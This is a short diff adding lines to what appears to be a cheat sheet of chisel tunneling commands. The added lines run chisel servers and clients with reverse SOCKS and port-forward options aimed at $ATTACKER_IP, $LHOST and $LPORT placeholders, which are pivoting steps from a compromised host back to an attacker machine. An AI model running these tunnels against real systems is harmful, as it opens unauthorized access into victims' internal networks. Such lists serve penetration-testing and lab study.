@@ -3,3 +3,10 @@ chisel client "$ATTACKER_IP":8080 R:socks
 chisel client "$ATTACKER_IP":8080 R:"$PORT":127.0.0.1:"$PORT"
 chisel server -p "$PORT" --socks5
 chisel client "$ATTACKER_IP":"$PORT" socks
+chisel server --reverse -p 8000
+chisel client "$LHOST":8000 R:socks
+chisel server -v -p 1234 --socks5
+chisel server -p "$PORT" --socks5 --reverse
+chisel client -v "$LHOST":1234 socks
+chisel client -v "$LHOST":1234 R:socks
+chisel client "$LHOST":"$LPORT" R:"$PORT":socks
